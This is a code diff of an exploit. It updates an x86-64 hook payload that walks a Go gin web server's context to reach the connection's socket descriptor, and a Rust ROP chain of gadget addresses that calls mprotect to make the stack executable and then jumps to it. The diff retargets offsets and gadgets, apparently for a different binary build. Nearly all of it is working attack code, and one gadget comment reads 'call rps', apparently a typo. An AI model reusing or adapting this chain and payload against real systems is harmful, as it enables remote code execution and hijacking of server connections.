@@ -28,15 +28,15 @@ payload_start:
     jnz end
 
     # Find file descriptor
-    # gin Context
-    mov rax, [rsp + 0x218]
-    # http response
-    mov rax, [rax+0x08]
-    # http conn
+    # get gin Context pointer
+    mov rax, [rsp + 0x1f8]
+    # deref gin context (interface)
+    mov rax, [rax + 0x08]
+    # follow conn pointer
     mov rax, [rax]
-    # net Conn
+    # follow netConn pointer (interface)
     mov rax, [rax + 0x18]
-    # netFD
+    # follow netFD pointer
     mov rax, [rax]
     # Save netFD location so we can null the fd in parent
     mov rsi, rax
@@ -91,7 +91,7 @@ end:
     pop rbx
     pop rax
     # do overwritten inst
-    lea    rcx,[rsp+0x180]
+    lea    rcx,[rsp+0x170]
     mov edi, 1
     # jump to after the patch
     mov r12, {return_after_hook}
@@ -157,14 +157,14 @@ unsafe extern "C" {
 
 pub const ROPCHAIN: &[usize] = &[
     // mprotect the stack and jump to the end
-    0x000000000084b625, // pop rdi; ret;
-    0,                  // PLACEHOLDER for RSP
-    0x0000000000842ae2, // pop rsi; ret;
+    0x000000000084fc82, // pop rdi; ret;
+    0x4141414141414141, // PLACEHOLDER for RSP
+    0x0000000000851802, // pop rsi; ret;
     0x10000,            // 10 page length
-    0x00000000005d7a0a, // pop rdx; ret;
+    0x0000000000652655, // pop rdx; ret;
     7,                  // RWX flags
-    0x000000000046572e, // pop rax; ret;
+    0x0000000000471c0e, // pop rax; ret;
     0xa,                // mprotect syscall number
-    0x00000000004849a9, // syscall; ret;
-    0x000000000041a2e7, // push rsp; ret;
+    0x0000000000490a29, // syscall; ret;
+    0x000000000048daf3, // call rps;
 ];
